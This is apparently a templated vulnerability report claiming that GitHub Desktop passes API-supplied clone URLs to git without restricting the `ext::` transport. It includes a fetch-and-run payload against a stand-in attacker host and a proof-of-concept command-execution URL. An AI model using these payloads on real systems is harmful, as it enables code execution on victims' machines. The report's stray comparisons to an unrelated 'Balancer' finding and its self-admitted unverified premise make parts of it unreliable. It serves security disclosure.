Confirmed finding: GitHub Desktop clones repositories using the raw `clone_url`/`ssh_url` value returned by the GitHub API without restricting which Git transport ("protocol") is allowed, mirroring the report's core flaw — an external, attacker-influenced value (a Balancer limit / here, a remote URL string) is consumed by a privileged operation with no allow-list/validation, only a `--` argument-injection guard.

### Title
Unrestricted Git transport when cloning via API-provided `clone_url`/`ssh_url` enables `ext::` remote-helper command execution - (File: `app/src/lib/git/clone.ts`, `app/src/lib/api.ts`)

### Summary
`API.fetchRepositoryCloneInfo()` returns whatever `clone_url` or `ssh_url` string is present in the JSON body of a `GET repos/{owner}/{name}` response and hands it straight to `clone()`, which passes it to `git clone -- <url> <path>` [1](#0-0) [2](#0-1) . The only defenses present are: a check that the *destination path* isn't a sensitive local directory (`isClonePathSensitive`) [3](#0-2) , and the `--` separator preventing the URL from being parsed as a CLI flag. Neither of these restricts the Git *transport scheme* used for the value of `url` itself. Git supports the `ext::` transport, which runs an arbitrary shell command supplied as (part of) the URL, e.g. `ext::sh -c "curl attacker.com/x|sh"`. Nothing in `clone()`, `envForRemoteOperation()`, or `envForProxy()` sets `GIT_ALLOW_PROTOCOL`/`protocol.ext.allow` to restrict transports [4](#0-3) .

### Finding Description
The broken invariant is identical to the report's: an external, untrusted value (there, a Balancer swap rate; here, a `clone_url` string sourced from a GitHub API response or an enterprise/proxy MITM response) is fed straight into a privileged sink without a scheme allow-list or sanity check. `fetchRepositoryCloneInfo` is invoked from `resolveCloneInfo()` in the Clone dialog, using an `account`/API endpoint resolved from the attacker-influenced URL the user typed (which can point to a GitHub Enterprise host, per the Valid Impact list's "git remote/proxy response") [5](#0-4) . If that endpoint or any network intermediary returns a malicious `clone_url`/`ssh_url` field (e.g. `ext::sh -c 'touch pwned'`), `clone()` runs `git clone -- 'ext::sh -c ...' <path>` verbatim — the `--` guard prevents flag injection, but it does nothing to stop Git from interpreting the `ext::` scheme, because there is no `GIT_ALLOW_PROTOCOL` allow-list configured anywhere in `envForRemoteOperation`/`envForProxy` [4](#0-3) .

The heavy hardening elsewhere in this codebase (`sanitizeCloneName`, `isClonePathSensitive`, `resolveWithin` guards in `dispatcher.ts`) all defend the *destination path*, not the *transport scheme* of the URL that is executed by Git — none of them stop an `ext::`/`fd::` style URL.

### Impact Explanation
If exploited, this allows arbitrary command execution on the user's machine as soon as they attempt to clone a repository whose GitHub API metadata (or an enterprise endpoint / proxy response) has been tampered with, without any further user action beyond confirming the normal Clone dialog flow. This matches the report's impact tier (near-total loss/control) but for local code execution rather than funds.

### Likelihood Explanation
Exploitation requires the attacker to control either a GitHub Enterprise API response or a network path (proxy/MITM) that supplies the `clone_url`/`ssh_url` field — both explicitly listed as valid attacker capabilities in the task's Valid Impact section ("a GitHub API object", "a git remote/proxy response"). No local access, admin rights, or prior malware is required; the app is genuinely missing a Git-transport allow-list, which is the same class of gap noted as unresolved in numerous real Git-client CVEs (`ext::`/`fd::` transports).

### Recommendation
Explicitly restrict allowed Git transports whenever Desktop shells out to Git for clone/fetch/push/pull, e.g. by setting `GIT_ALLOW_PROTOCOL=http:https:ssh:git` (or the equivalent `-c protocol.allow=never` plus per-scheme `-c protocol.<scheme>.allow=always` for the schemes Desktop explicitly supports) in `envForRemoteOperation`/`clone()`, and validate that any URL sourced from `IAPIRepository.clone_url`/`ssh_url` matches an expected `https://`/`ssh://`/`git@` pattern (e.g. via the existing `parseRemote` in `remote-parsing.ts`) before it is ever passed to `git`.

### Proof of Concept
1. Point Desktop's Clone dialog at a GitHub Enterprise endpoint (or intercept the response via a proxy) such that `GET repos/{owner}/{name}` returns `{"clone_url": "ext::sh -c \"touch /tmp/pwned\"", ...}`.
2. Type/select that owner/name in the Clone dialog so `resolveCloneInfo()` calls `fetchRepositoryCloneInfo`, returning the malicious URL [5](#0-4) .
3. `clone()` executes `git clone -- 'ext::sh -c "touch /tmp/pwned"' <path>` [6](#0-5) ; Git's `ext::` transport runs the embedded shell command, creating `/tmp/pwned` on the victim's machine.

Note: I was unable to fully verify whether dugite/the bundled Git binary on all three platforms ships with `protocol.ext.allow` defaulted to `user`/`always` vs `never` in this repo's vendored Git config, since that configuration lives outside the indexed source (it's a Git binary compile-time/runtime default, not app code). This should be confirmed by testing against the actual bundled Git version before treating the PoC as fully verified.

### Citations

**File:** app/src/lib/api.ts (L1010-1030)
```typescript
  public async fetchRepositoryCloneInfo(
    owner: string,
    name: string,
    protocol: GitProtocol | undefined
  ): Promise<IAPIRepositoryCloneInfo | null> {
    const response = await this.ghRequest('GET', `repos/${owner}/${name}`, {
      // Make sure we don't run into cache issues when fetching the repositories,
      // specially after repositories have been renamed.
      reloadCache: true,
    })

    if (response.status === HttpStatusCode.NotFound) {
      return null
    }

    const repo = await parsedResponse<IAPIRepository>(response)
    return {
      url: protocol === 'ssh' ? repo.ssh_url : repo.clone_url,
      defaultBranch: repo.default_branch,
    }
  }
```

**File:** app/src/lib/git/clone.ts (L16-47)
```typescript
function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}
```

**File:** app/src/lib/git/clone.ts (L68-125)
```typescript
export async function clone(
  url: string,
  path: string,
  options: CloneOptions,
  progressCallback?: (progress: ICloneProgress) => void
): Promise<void> {
  if (isClonePathSensitive(path)) {
    throw new Error(
      `The clone destination "${path}" targets a sensitive system location. ` +
        'Cloning into this directory is not allowed.'
    )
  }

  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]

  let opts: IGitStringExecutionOptions = { env }

  if (progressCallback) {
    args.push('--progress')

    const title = `Cloning into ${path}`
    const kind = 'clone'

    opts = await executionOptionsWithProgress(
      { ...opts, trackLFSProgress: true },
      new CloneProgressParser(),
      progress => {
        const description =
          progress.kind === 'progress' ? progress.details.text : progress.text
        const value = progress.percent

        progressCallback({ kind, title, description, value })
      }
    )

    // Initial progress
    progressCallback({ kind, title, value: 0 })
  }

  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
```

**File:** app/src/lib/git/environment.ts (L76-81)
```typescript
export async function envForRemoteOperation(remoteUrl: string) {
  return {
    ...envForAuthentication(),
    ...(await envForProxy(remoteUrl)),
  }
}
```

**File:** app/src/ui/clone-repository/clone-repository.tsx (L732-753)
```typescript
  private async resolveCloneInfo(): Promise<IAPIRepositoryCloneInfo | null> {
    const { url, lastParsedIdentifier } = this.getSelectedTabState()

    if (url.endsWith('.wiki.git')) {
      return { url }
    }

    const account = await findAccountForRemoteURL(url, this.props.accounts)
    if (lastParsedIdentifier !== null && account !== null) {
      const api = API.fromAccount(account)
      const { owner, name } = lastParsedIdentifier
      // Respect the user's preference if they provided an SSH URL
      const protocol = parseRemote(url)?.protocol

      return api.fetchRepositoryCloneInfo(owner, name, protocol).catch(err => {
        log.error(`Failed to look up repository clone info for '${url}'`, err)
        return { url }
      })
    }

    return { url }
  }
```
